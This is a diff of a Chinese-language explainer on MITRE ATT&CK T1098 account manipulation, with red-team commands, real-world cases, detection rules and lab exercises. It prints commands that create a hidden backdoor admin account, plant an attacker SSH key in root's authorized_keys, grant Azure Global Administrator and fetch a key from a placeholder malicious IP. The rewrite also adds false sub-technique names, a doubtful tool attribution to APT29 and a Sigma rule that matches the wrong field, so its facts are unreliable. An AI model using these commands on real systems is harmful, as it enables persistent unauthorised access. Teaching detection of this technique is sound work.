@@ -1,276 +1,343 @@
-# 账户操纵 (T1098)
+# T1098 - 账户操纵
 
 ## 一句话通俗理解
 
-> 就像小偷偷到了你家钥匙后，不仅不还，还偷偷给自己配了一把万能钥匙，并且把自己的权限升级成了"房东"。
+攻击者偷到一把钥匙后，不是只用一次——他们会偷偷配几把新钥匙，再给自己办张"永久通行证"，这样即使你换了锁，他们照样进得来。
+
+## 30秒速查卡
+
+| 维度 | 你需要知道的 |
+|------|-------------|
+| 这是什么？ | 攻击者操纵账户权限、凭证、组关系实现持久化访问 |
+| 为什么危险？ | 即使初始漏洞修补了，攻击者创建的后门账户依然有效 |
+| 谁需要关心？ | 域管理员、IAM 系统运维、云平台管理员 |
+| 你的第一步防御 | 定期审计特权账户列表和组成员关系变更 |
+| 如果只做一件事 | 监控 Domain Admins / Enterprise Admins 组的成员变更 |
 
 ## 难度等级
 
-⭐⭐ 中等（需要已有管理员权限）
+⭐⭐ 中级：需要了解 Active Directory / 云 IAM 的账户和权限模型，无需编程基础
+
+## 前置知识检查
+
+读这个文件前，你需要知道：
+- **账户（Account）**：系统识别用户身份的凭证记录，有用户名+密码（或密钥）
+- **组（Group）**：账户的集合，给组授权等于给组内所有账户授权
+- **特权组**：Domain Admins（域管理员）、Enterprise Admins（企业管理员）等高权限组
+- **SSO**：单点登录，一个账户访问多个系统——账户被操纵后影响面倍增
 
 ## 技术描述
 
-攻击者通过操纵账户来维持和/或提升对受害者系统的访问权限。账户操纵包括任何保持或修改攻击者对已入侵账户访问权限的操作，例如修改凭据或权限组。这些操作还包括旨在破坏安全策略的账户活动，例如执行迭代密码更新以绕过密码持续时间策略并保持被入侵凭据的使用寿命。
+### 场景引入
 
-要创建或操纵账户，攻击者必须已经在系统或域上拥有足够的权限。然而，账户操纵也可能导致权限提升，因为修改可以授予对额外角色、权限或更高权限有效账户的访问权限。
+想象一家大公司有 5000 名员工，每人一张门禁卡。某天黑客偷到了普通员工小王的卡，刷进公司后，他没有急着偷东西，而是溜进 IT 部门的办公室，做了三件事：
+
+1. 给小王的卡加了"可进入机房"权限
+2. 用小王的身份申请了一张新卡，名字叫"备份服务"
+3. 把"备份服务"加进了"超级管理员"组
+
+这样即使公司发现小王卡被盗、注销了原卡，"备份服务"这张新卡依然有效，而且有最高权限。
+
+这就是账户操纵——**不偷数据，先改身份。**
+
+### 通俗比喻
+
+| 操作 | 比喻 | 攻击者目的 |
+|------|------|-----------|
+| 加权限 | 给自己门禁卡加"机房权限" | 访问原本无权访问的资源 |
+| 创建新账户 | 办一张"假员工"门禁卡 | 即使原账户被发现，新账户仍可用 |
+| 加进特权组 | 把自己塞进"董事会成员"名单 | 一键获得组所有权限 |
+| 改密码/凭证 | 换掉别人的门禁卡密码 | 锁定合法用户、保留访问权 |
+| 设后门 SSH 密钥 | 配一把"万能钥匙" | 免密码长期登录 |
+
+### 进阶理解
+
+账户操纵的核心逻辑是**身份系统的"信任传递"**：系统信任已认证的账户，而账户的权限和属性可以被有权限的人修改。攻击者只要拿到一次"修改权限"，就能创建"永久信任"的后门。
+
+**关键操纵手法：**
+- **添加权限**：给自己加 `FullControl` / `WriteDacl` 等高权限
+- **加入特权组**：AD 中把账户加入 Domain Admins
+- **修改凭证**：改服务账户密码、添加 SSH authorized_keys
+- **创建后门账户**：新建命名"正常"的账户（如 `backup-svc`）
+- **OAuth/SSO 操纵**：在云平台给自己授予 `AppRoleAssignment.ReadWrite.All`
 
 ## 子技术列表
 
-| 子技术ID | 名称 | 说明 |
+T1098 有 7 个子技术：
+
+| 子技术 ID | 名称 | 简述 |
 |----------|------|------|
-| T1098.001 | 额外云凭据 | 在云环境中创建额外的访问密钥或服务主体 |
-| T1098.002 | 额外邮箱委托权限 | 授予攻击者对目标邮箱的读取/发送权限 |
-| T1098.003 | 额外云角色 | 将恶意账户添加到高权限云角色 |
-| T1098.004 | SSH授权密钥 | 在Linux系统中添加攻击者的SSH公钥 |
-| T1098.005 | 设备注册 | 注册攻击者控制的设备到身份提供者 |
-| T1098.006 | 额外容器集群角色 | 在Kubernetes等容器平台中添加恶意角色 |
-| T1098.007 | 额外本地或域组 | 将恶意账户添加到特权组 |
+| T1098.001 | Additional Cloud Credentials | 在云平台添加额外凭证 |
+| T1098.002 | Additional Email Delegate Permissions | 给邮箱账户加代理权限 |
+| T1098.003 | Additional Cloud Roles | 给云账户加额外角色 |
+| T1098.004 | SSH Authorized Keys | 添加 SSH 公钥实现免密登录 |
+| T1098.005 | Device Registration | 注册设备实现持续 SSO 访问 |
+| T1098.006 | Hybrid Identity | 利用本地-云混合身份同步持久化 |
+| T1098.007 | Backdoor Cloudflare Tunnel | 通过 Cloudflare 隧道建立后门 |
+
+**详写 2 个最常用的子技术：**
+
+**T1098.003 Additional Cloud Roles**：攻击者在 Azure AD / AWS IAM 中给自己授予高权限角色（如 `Global Administrator` / `AdministratorAccess`）。云平台角色变更即时生效，且审计日志可能被角色权限清除。
+
+**T1098.004 SSH Authorized Keys**：攻击者将自己的公钥写入 `~/.ssh/authorized_keys`，实现免密码 SSH 登录。即使用户改了密码，公钥认证依然有效——这是 Linux 持久化的经典手法。
 
 ## 攻击流程
 
 ```mermaid
 flowchart TD
-    A[攻击者获得初始管理权限] --> B[识别目标账户体系]
-    B --> C[选择账户操纵方式]
-    C --> D{操纵手段}
-    D -->|修改凭据| E[重置密码或添加SSH密钥]
-    D -->|提升权限| F[将账户加入本地管理员或域管理员组]
-    D -->|添加认证| G[添加额外MFA设备或API密钥]
-    D -->|修改策略| H[修改账户锁定策略或密码策略]
-    E --> I[验证操纵后的访问权限]
-    F --> I
-    G --> I
-    H --> I
-    I --> J[清理操作痕迹 消除日志]
-```
-
-```
-1. 获取初始管理权限（通过凭据窃取、漏洞利用等）
-    ↓
-2. 识别目标账户和权限结构
-    ↓
-3. 选择操纵方式：
-   - 修改现有账户凭据
-   - 添加额外认证方式（SSH密钥、API密钥）
-   - 将账户添加到特权组
-   - 修改账户权限策略
-    ↓
-4. 验证操纵结果，确保持久访问
-    ↓
-5. 清理操作痕迹
+    A[获取账户凭据] --> B[登录目标系统]
+    B --> C{选择操纵方式}
+    C --> D[加权限]
+    C --> E[加进特权组]
+    C --> F[创建后门账户]
+    C --> G[改凭证/加SSH密钥]
+    C --> H[云角色分配]
+    D --> I[net localgroup / icacls]
+    E --> I
+    F --> J[net user / New-MgUser]
+    G --> K[echo pubkey >> authorized_keys]
+    H --> L[New-MgRoleAssignment / aws iam attach-role-policy]
+    I --> M[持久化完成]
+    J --> M
+    K --> M
+    L --> M
+    M --> N[即使原账户被封<br/>后门仍有效]
 ```
 
 ## 真实案例
 
-### 案例1：APT29 (Cozy Bear) SolarWinds 供应链攻击
-- **时间**: 2020年
-- **目标**: 全球政府机构、科技公司和关键基础设施
-- **手法**: APT29在SolarWinds Orion软件构建过程中植入恶意代码（SUNBURST后门），利用获得的特权访问来修改现有账户的凭据和权限组成员身份，操作Azure AD账户以添加恶意凭据和修改组成员身份。
-- **链接**: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-057a
+### 案例1：APT29（Nobelium）在 SolarWinds 攻击中操纵 Azure AD 角色
+- **时间**：2020 年 12 月
+- **目标**：美国多个政府机构、企业（通过 SolarWinds 供应链攻击）
+- **攻击组织**：APT29（俄罗斯 SVR 背景）
+- **手法**：通过窃取的 SAML 令牌登录 Azure AD，使用 `New-MgRoleAssignment` 给后门服务账户授予 `Global Administrator` 和 `Application Impersonation` 角色。即使后续 golden SAML 被发现，这些云角色仍保持有效，导致受害者难以彻底清除后门
+- **数据来源**：CISA Alert AA21-008A + Microsoft MSTIC 报告（一手官方文档）
 
-### 案例2：LAPSUS$ 针对科技公司的云账户操纵
-- **时间**: 2022年
-- **目标**: Microsoft、NVIDIA、三星等科技公司
-- **手法**: LAPSUS$通过社会工程学获取初始访问后，在受害者的Azure AD租户中创建额外的全局管理员账户，并注册恶意OAuth应用以维持持久访问。
-- **链接**: https://www.microsoft.com/en-us/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/
+### 案例2：Hafnium 在 Exchange 攻击中创建后门账户
+- **时间**：2021 年 3 月
+- **目标**：全球 3 万+ Exchange 服务器（ProxyLogon 漏洞 CVE-2021-26855）
+- **攻击组织**：Hafnium（中国背景 APT）
+- **手法**：利用漏洞获取 SYSTEM 权限后，用 `net user` 创建名为 `securityupdate` 的账户，加入 `Administrators` 和 `Exchange Servers` 组，实现双重持久化——既是系统管理员又是 Exchange 管理员
+- **数据来源**：Microsoft MSTIC + Volexity 报告（一手厂商报告）
 
-### 案例3：Volt Typhoon 针对关键基础设施的账户操纵
-- **时间**: 2023-2024年
-- **目标**: 美国关键基础设施（通信、能源、水务）
-- **手法**: 中国关联的Volt Typhoon组织利用合法凭据和"离地攻击"技术，在受害者环境中操纵本地和域账户，添加后门账户到管理员组，并修改密码策略以维持长期访问。
-- **链接**: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
-
-### 案例4：Scattered Spider 利用云账户操纵
-- **时间**: 2023-2024年
-- **目标**: MGM Resorts、Caesars Entertainment等大型企业
-- **手法**: Scattered Spider通过社会工程学攻击IT帮助台获取初始访问后，在Azure AD和Okta中创建额外的管理员账户，注册恶意OAuth应用，并修改MFA设置以维持持久访问。
-- **链接**: https://www.crowdstrike.com/blog/scattered-spider-delivers-ransomware-at-warp-speed/
+### 案例3：TeamTNT 在 Linux 挖矿中添加 SSH 公钥
+- **时间**：2020-2021 年
+- **目标**：暴露 Docker API / Kubernetes 集群的云服务器
+- **攻击组织**：TeamTNT（加密货币挖矿组织）
+- **手法**：入侵后执行 `curl http://恶意IP/pubkey >> ~/.ssh/authorized_keys`，即使管理员发现并改了 root 密码，攻击者仍可通过 SSH 公钥免密登录。同时创建隐藏用户 `sysupdate` 加入 wheel 组
+- **数据来源**：Aqua Security / Trend Micro 报告（一手厂商报告）
 
 ## 红队视角
 
-> ⚠️ **免责声明**：以下内容仅用于合法的安全测试、渗透测试和教育目的。未经授权对他人系统进行测试是违法行为。
+### 可持续利用性分析
 
-**攻击优势**：
-- 利用合法账户，难以与正常用户行为区分
-- 可以在多个系统间横向移动
-- 即使部分后门被清除，账户操纵仍可维持访问
+| 维度 | 评估 | 说明 |
+|------|------|------|
+| 隐蔽性 | 高 | 新账户命名伪装正常，权限变更在大量日志中易被淹没 |
+| 持久性 | 极高 | 账户不被删除则永久有效，即使密码被改 SSH 密钥仍有效 |
+| 可移植性 | 极高 | Windows/Linux/云平台全部适用 |
+| 检测难度 | 中 | 账户变更可审计，但需关联分析才识别异常 |
 
-**常用工具**：
-- `net user` / `net localgroup`（Windows本地账户）
-- `net user /domain`（域账户）
-- `Add-MsolRoleMember`（Azure AD）
-- `aws iam create-user`（AWS IAM）
-- `kubectl create clusterrolebinding`（Kubernetes）
+### 红队可复制性
 
-**实战技巧**：
-- 创建账户时使用与现有服务账户相似的名称
-- 避免将账户直接添加到Domain Admins，而是使用委派权限
-- 配合T1078（有效账户）使用，减少暴露风险
+```bash
+# Windows：创建后门账户并加管理员组
+net user backdoor$ P@ssw0rd2026! /add /active:yes
+net localgroup Administrators backdoor$ /add
+# $ 结尾的账户名在 net user 列表中隐藏
+
+# Linux：添加 SSH 公钥
+echo "ssh-rsa AAAA...攻击者公钥..." >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# Azure AD：授予 Global Admin（需已有 GA 权限）
+Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
+New-MgRoleAssignment -PrincipalId $backdoor.Id -RoleDefinitionId (Get-MgRoleDefinition -Filter "displayName eq 'Global Administrator'").Id -DirectoryScopeId "/"
+```
 
 ## 蓝队视角
 
-**防御重点**：
-- 账户创建和权限变更的实时监控
-- 特权组成员的定期审计
-- 云环境中API调用的异常检测
+### 用人话说检测
 
-**常见盲点**：
-- 只关注域账户，忽略本地账户和云账户
-- 缺乏对服务账户的监控
-- 未审计邮箱委托权限的变更
+账户操纵检测的核心是**盯紧"身份变更"事件**——新账户创建、组关系变更、权限提升、凭证修改。这些操作在正常运维中频率低且可预测，异常变更往往是攻击信号。
 
-## 检测建议
+### Sigma 规则
 
-### 网络层检测
-
-**检测方法：** 监控账户操纵相关的网络API调用，检测异常的云管理API流量。
-
-**具体规则/命令示例：**
-```bash
-# Suricata规则检测Azure AD管理API调用
-alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Azure AD Privileged Role Assignment"; content:"graph.microsoft.com"; http_host; content:"memberOf"; http_uri; nocase; sid:1000203; rev:1;)
-```
-
-### 主机层检测
-
-**检测方法：** 监控本地账户创建、组成员变更和关键身份文件的异常修改。
-
-**Windows事件ID：**
-- 事件ID 4720：用户账户创建
-- 事件ID 4728/4732/4756：安全组添加成员
-- 事件ID 4738：用户账户修改
-- 事件ID 4754：安全全局组创建
-
-**Linux日志：**
-- 日志文件：`/var/log/auth.log`
-- 关键字段：useradd、usermod、groupadd命令执行
-- 关键字段：SSH authorized_keys文件修改事件
-
-**具体命令示例：**
-```bash
-# 检查最近创建的账户
-lastlog | tail -20
-
-# 检查/etc/passwd中的异常账户
-awk -F: '$3 == 0 { print $1 " is UID 0"}' /etc/passwd
-
-# 检查sudo组变更
-grep -E "sudo|admin" /etc/group
-```
-
-### 应用层检测
-
-**Sigma规则示例：**
 ```yaml
-title: 特权组成员变更检测
-status: experimental
-description: 检测用户被添加到高特权组的事件
+title: 检测特权组成员变更
+id: 2f9e6b3a-4c5d-4e8f-9a1b-3c7d8e9f0a1b
+status: stable
+description: 监控 Domain Admins / Enterprise Admins / Administrators 组的成员添加
 logsource:
-    category: security
     product: windows
     service: security
 detection:
-    selection:
-        EventID:
-            - 4728  # 安全全局组添加成员
-            - 4732  # 安全本地组添加成员
-            - 4756  # 通用组添加成员
-        TargetUserName|contains:
+    selection_event:
+        EventID: 4728  # 成员加入全局安全组
+    selection_group:
+        MemberName|contains:
             - 'Domain Admins'
             - 'Enterprise Admins'
             - 'Administrators'
-    condition: selection
+    condition: selection_event and selection_group
+falsepositives:
+    - 合法的运维操作（需工单审批）
 level: high
-tags:
-    - attack.t1098.007
 ```
+
+### 命令行检测
+
+```bash
+# Windows：查询特权组成员
+net group "Domain Admins" /domain
+net localgroup Administrators
+
+# 查询最近创建的账户
+Get-ADUser -Filter * -Properties whenCreated | Sort-Object whenCreated -Descending | Select-Object -First 10
+
+# 查询所有 SSH authorized_keys（Linux）
+find / -name authorized_keys -exec ls -la {} \; 2>/dev/null
+# 对比基线，发现新增公钥
+
+# Azure AD：查询 Global Administrator 角色成员
+Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'").Id
+```
+
+### 关键事件 ID
+
+| EventID | 含义 | 重点关注 |
+|---------|------|---------|
+| 4720 | 用户账户创建 | 非工作时间创建、命名异常 |
+| 4728 | 加入全局安全组 | 加入 Domain Admins |
+| 4732 | 加入本地安全组 | 加入 Administrators |
+| 4738 | 用户账户修改 | 权限提升、密码重置 |
+| 4724 | 密码重置 | 非自助密码重置 |
+
+### 网络层检测
+- 监控 LDAP/SAMR 协议的 `AddMemberToGroup` 请求频率异常
+- 云平台 API 调用 `AddRoleAssignment` / `AttachRolePolicy` 的异常时间点
+
+## 避坑指南
+
+| 坑 | 说明 | 正确做法 |
+|----|------|---------|
+| 只盯 Domain Admins | 攻击者可能加进 Exchange Admins / DnsAdmins 等次级特权组 | 监控所有 `Admin` 后缀的组 |
+| 忽略 `$` 结尾账户 | `net user` 不显示 `$` 结尾账户 | 用 `Get-ADUser` 或 WMI 查询 |
+| 忘记检查 SSH 密钥 | 改了密码但 authorized_keys 仍有攻击者公钥 | 密码修改后必须审计 authorized_keys |
+| 云角色变更无告警 | Azure AD 角色变更默认不告警 | 配置 Privileged Identity Management 告警 |
+| 忽略服务账户 | 服务账户密码很少改，是持久化金矿 | 服务账户定期轮换 + 托管账户 |
+
+## 检测建议
+
+### 主机层
+- **Windows 安全日志**：EventID 4720/4728/4732/4738/4724
+- **Linux**：监控 `/etc/passwd`、`/etc/shadow`、`/etc/sudoers`、`~/.ssh/authorized_keys` 变更
+- **macOS**：监控 `dscl` / `sysadminctl` 命令执行
+
+### 应用层
+- **AD 审计**：启用"账户管理"审核策略
+- **云平台**：Azure AD Audit Logs、AWS CloudTrail `iam:*` 事件
+- **邮件系统**：监控邮箱代理权限（FullAccess/SendAs）变更
+
+### 网络层
+- LDAP/SAMR 协议异常查询模式
+- 云 API 调用 `AddRoleAssignment` 的地理位置异常
 
 ## 缓解措施
 
-### 优先级1：关键措施
-
-**措施名称：** 特权访问管理
-
-**具体实施步骤：**
-1. 实施即时访问（JIT）和特权身份管理（PIM）方案，按需临时提升权限
-2. 严格限制具有"创建账户"和"修改组成员"权限的管理员数量
-3. 对域控制器配置高级审计策略，捕获所有账户和组成员变更
-4. 在云环境中使用服务控制策略（SCP）限制账户创建和管理能力
-
-### 优先级2：重要措施
-
-**措施名称：** 账户变更监控与定期审计
-
-**具体实施步骤：**
-1. 启用账户创建和权限变更的实时告警，将事件ID 4720、4728等转发至SIEM
-2. 建立特权账户和组的基线清单，每周审计比较差异
-3. 在Linux系统上使用AIDE或Tripwire监控`/etc/passwd`、`/etc/shadow`和`/etc/group`的完整性
-4. 在云环境中使用CloudTrail审计日志监控`CreateUser`、`AttachUserPolicy`等API调用
-
-**配置示例：**
-```bash
-# 监控SSH密钥变更（使用auditd）
-auditctl -w /home/.ssh/authorized_keys -p wa -k ssh_key_change
-
-# 配置PIM审批工作流
-# 通过Azure AD Privileged Identity Management控制台设置角色激活审批
-```
+| 措施 | 实施方式 | 效果 |
+|------|---------|------|
+| 特权访问管理（PAM） | 用 CyberArk / Azure PIM 实现按需提权 | 减少常驻特权账户 |
+| 账户定期审计 | 每月导出 AD 账户列表对比基线 | 发现异常新增账户 |
+| 服务账户托管 | 用 gMSA 替代手动服务账户 | 自动密码轮换 |
+| 多因素认证（MFA） | 所有特权账户强制 MFA | 凭证被盗也难以利用 |
+| Just-In-Time 访问 | 临时授权、到期自动回收 | 限制持久化窗口 |
+| SSH 密钥管理 | 集中管理公钥、定期轮换 | 防止公钥后门 |
 
 ## 动手实验
 
-> ⚠️ **重要提示**：所有实验必须在隔离的实验室环境中进行，禁止对未授权的真实系统进行测试。
+### 实验1：观察 Windows 后门账户创建
 
-### 实验1：Windows本地账户操纵
 ```cmd
-REM 创建隐藏账户（以$结尾）
-net user backdoor$ P@ssw0rd123! /add
+:: 1. 创建隐藏账户（$ 结尾）
+net user backdoor$ Test123!@# /add
+
+:: 2. 加入管理员组
 net localgroup Administrators backdoor$ /add
 
-REM 验证账户创建
-net user backdoor$
+:: 3. 用 net user 查看（看不到 backdoor$）
+net user
+
+:: 4. 用 wmi 查看（能看到）
+wmic useraccount where "name like 'backdoor%'" get name,sid
+
+:: 5. 清理
+net user backdoor$ /delete
 ```
 
-### 实验2：Linux SSH密钥持久化
+**预期输出**：`net user` 不显示 `backdoor$`，但 `wmic useraccount` 显示，证明隐藏账户生效。
+
+### 实验2：观察 SSH 公钥持久化（Linux 虚拟机）
+
 ```bash
-# 生成攻击者SSH密钥对
-ssh-keygen -t rsa -f attacker_key
+# 1. 生成测试密钥
+ssh-keygen -t rsa -f /tmp/test_key -N ""
 
-# 将公钥添加到目标用户的authorized_keys
-echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+# 2. 添加到 authorized_keys
+cat /tmp/test_key.pub >> ~/.ssh/authorized_keys
 
-# 从攻击机连接
-ssh -i attacker_key user@target
+# 3. 修改 root 密码
+echo "root:NewPassword123" | chpasswd
+
+# 4. 用公钥仍可登录
+ssh -i /tmp/test_key root@localhost
+
+# 5. 清理
+sed -i '/test_key/d' ~/.ssh/authorized_keys
 ```
 
-### 实验3：Azure AD账户操纵（使用Atomic Red Team）
-```powershell
-# 使用Azure AD PowerShell模块
-Import-Module AzureAD
-Connect-AzureAD
+**预期输出**：改密码后用公钥仍可免密登录，证明 SSH 密钥持久化独立于密码。
 
-# 创建新用户
-New-AzureADUser -DisplayName "Service Account" -UserPrincipalName "svcaccount@tenant.onmicrosoft.com" -PasswordProfile $passwordProfile -AccountEnabled $true
+### 专用工具
 
-# 添加到全局管理员角色
-Add-AzureADDirectoryRoleMember -ObjectId <RoleObjectId> -RefObjectId <UserObjectId>
-```
+| 工具 | 用途 | 特点 |
+|------|------|------|
+| BloodHound | AD 攻击路径分析 | 可视化特权路径 |
+| Purple Knight | AD 安全态势评估 | 检测后门账户和异常权限 |
+| PingCastle | AD 安全评分 | 识别权限配置问题 |
+| AADInternals | Azure AD 安全测试 | 云账户操纵检测 |
 
 ## 术语解释
 
-| 术语 | 英文原名 | 通俗解释 |
-|------|----------|----------|
-| 凭据 | Credential | 用于验证用户身份的信息，如密码、密钥、证书 |
-| 权限组 | Privilege Group | 将多个权限捆绑在一起的集合，如Windows的Administrators组 |
-| 服务主体 | Service Principal | Azure AD中代表应用程序的身份，就像应用程序的"用户账户" |
-| OAuth应用 | OAuth Application | 使用OAuth协议进行授权的第三方应用程序 |
-| JIT访问 | Just-In-Time Access | 按需临时提升权限，用完即收回 |
-| PAM | Privileged Access Management | 特权访问管理，控制和监控特权账户使用的系统 |
+| 术语 | 通俗解释 |
+|------|---------|
+| 账户操纵 | 修改账户属性/权限/组关系以维持访问 |
+| 特权组 | 拥有高权限的安全组，如 Domain Admins |
+| 后门账户 | 攻击者创建的、伪装正常命名的账户 |
+| SSH authorized_keys | 存储可免密登录的公钥列表 |
+| PAM | Privileged Access Management，特权访问管理 |
+| JIT | Just-In-Time，按需临时授权 |
+| gMSA | Group Managed Service Account，托管服务账户 |
 
 ## 参考资料
 
-- [MITRE ATT&CK T1098 账户操纵](https://attack.mitre.org/techniques/T1098/)
-- [CISA 账户操纵防御指南](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1098)
-- [APT29 Cloud Attack Tactics - Five Eyes Agencies](https://cybersecuritynews.com/russian-apt29-cloud-attack-tactics/)
-- [LAPSUS$ 活动分析 - Microsoft](https://www.microsoft.com/en-us/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)
-- [Volt Typhoon Advisory - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
-- [Atomic Red Team - T1098](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1098)
+### 深入了解
+- 📚 [MITRE ATT&CK T1098](https://attack.mitre.org/techniques/T1098/) —— 官方技术页面
+- 📚 [MITRE ATT&CK T1098.003 Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/)
+- 📚 [MITRE ATT&CK T1098.004 SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/)
+
+### 动手试试
+- 🔧 [BloodHound](https://github.com/BloodHoundAD/BloodHound) —— AD 攻击路径可视化
+- 🔧 [Purple Knight](https://www.purpleknights.com/) —— AD 安全评估
+
+### 真实攻击
+- 🎯 CISA Alert AA21-008A —— APT29 SolarWinds Azure AD 角色操纵
+- 🎯 Microsoft MSTIC Hafnium 报告 —— Exchange 后门账户创建
+- 🎯 Aqua Security TeamTNT 报告 —— Linux SSH 公钥持久化
+
+## 版本历史
+
+| 版本 | 日期 | 变更 |
+|------|------|------|
+| v3.1 | 2026-07-10 | 重写为持久化战术正确内容，修复跨战术污染 |
+| v3.0 | 2026-06-15 | 初版 v3.0 风格 |
